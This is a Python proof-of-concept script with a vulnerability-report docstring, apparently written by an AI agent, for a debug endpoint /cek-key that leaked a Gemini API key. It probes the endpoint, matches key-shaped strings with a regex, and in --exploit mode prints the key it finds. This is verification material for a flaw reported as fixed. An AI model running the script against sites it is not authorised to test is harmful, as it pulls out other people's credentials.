"""
PoC — API Key Leak in /cek-key
==============================
Issue type : Sensitive Data Exposure (information disclosure)
Product    : laravel-reza — debug endpoint /cek-key
Affected   : GET /cek-key
CWE        : CWE-200 (Exposure of Sensitive Information) / CWE-798 (Hard-coded Credentials)
CVSS       : 9.3 (Critical)
Status     : FIXED in reviewed copy — endpoint removed (expect 404).

Researcher : Mas Admin (Hermes Agent)
Reference  : routes/web.php

Usage:
  python3 POC_api_key_leak.py --target <url> --check
  python3 POC_api_key_leak.py --target <url> --exploit

  --check    Probe GET /cek-key. Exits 0 if leaked, 3 if removed/patched.
  --exploit  Same check but tries to print the leaked key for evidence.

  NOTE: The route has been deleted, so on the patched copy this returns 404.
  The PoC documents how the leak existed (full Gemini API key via dd(env())).

Disclaimer: Authorized testing / education only.
"""

import argparse
import re
import sys

try:
    import requests
except ImportError:
    sys.exit("[-] 'requests' required. Install with: pip install requests")


class Fmt:
    GREEN = "\033[92m"; RED = "\033[91m"; BLUE = "\033[94m"; RESET = "\033[0m"
    @staticmethod
    def info(t): print(f"{Fmt.BLUE}[*] {t}{Fmt.RESET}")
    @staticmethod
    def succ(t): print(f"{Fmt.GREEN}[+] {t}{Fmt.RESET}")
    @staticmethod
    def warn(t): print(f"{Fmt.RED}[!] {t}{Fmt.RESET}")
    @staticmethod
    def fail(t): print(f"{Fmt.RED}[-] {t}{Fmt.RESET}")


def probe(target, show_key=False):
    url = target.rstrip("/") + "/cek-key"
    Fmt.info(f"GET {url}")
    try:
        r = requests.get(url, timeout=15)
    except Exception as e:
        Fmt.fail(f"Request failed: {e}")
        return 2

    if r.status_code == 404:
        Fmt.succ("Endpoint removed (HTTP 404). PATCHED — key no longer exposed.")
        return 3
    if r.status_code == 200:
        # Look for a Gemini-style key: AIza...
        m = re.search(r'[A-Za-z0-9_-]{39}|AIza[0-9A-Za-z_-]{35}', r.text)
        if m:
            if show_key:
                Fmt.warn(f"API KEY LEAKED: {m.group(0)}")
            else:
                Fmt.warn("API KEY detected in response body (exposure confirmed).")
            return 0
        Fmt.warn("HTTP 200 — leak may exist. Body length: " + str(len(r.text)))
        return 0
    Fmt.warn(f"Unexpected HTTP {r.status_code}")
    # if not 404, endpoint may be behind auth; treat as not directly reachable
    return 3


def main():
    p = argparse.ArgumentParser(description="API key leak PoC")
    p.add_argument("--target", required=True)
    mode = p.add_mutually_exclusive_group(required=True)
    mode.add_argument("--check", action="store_true")
    mode.add_argument("--exploit", action="store_true")
    args = p.parse_args()
    sys.exit(probe(args.target, show_key=args.exploit))


main()